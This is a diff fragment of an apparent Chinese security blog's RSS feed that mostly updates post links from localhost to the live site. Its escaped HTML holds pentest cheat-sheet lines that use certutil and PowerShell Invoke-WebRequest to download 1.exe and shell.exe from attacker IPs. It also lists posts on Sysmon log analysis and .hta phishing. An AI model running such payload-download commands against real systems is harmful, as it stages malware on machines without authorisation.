+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certutil -urlcache -split &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;/&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;.exe C:\windows\tasks\&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;.exe
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;/shell.exe -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\users\sqlsvc\Documents&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;或者
@@ -3302,10 +3342,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>剥茧之书</title>
-        <link>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:42:11 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;事件日志分析&#34;&gt;事件日志分析
 &lt;/h2&gt;&lt;p&gt;Sysmon日志是由Microsoft系统监视器（Sysmon）生成的事件日志，它们提供有关Windows上的系统级操作的详细信息，并记录进程启动、网络连接、文件和注册表修改、驱动程序和服务活动以及WMI操作等活动，通过分析Sysmon日志，安全专家可以检测潜在风险、发现异常并响应安全事件，以增强整体系统监控和安全性。在不断变化的网络安全环境中，提前防范威胁非常重要。&lt;/p&gt;
 &lt;h3 id=&#34;event-id事件id&#34;&gt;Event ID(事件id)
@@ -3600,10 +3640,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>渊蜂之书</title>
-        <link>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:25:37 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;钓鱼相关&#34;&gt;钓鱼相关
 &lt;/h2&gt;&lt;h3 id=&#34;hta加载js源码&#34;&gt;.hta加载js源码
 &lt;/h3&gt;&lt;p&gt;（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）&lt;/p&gt;
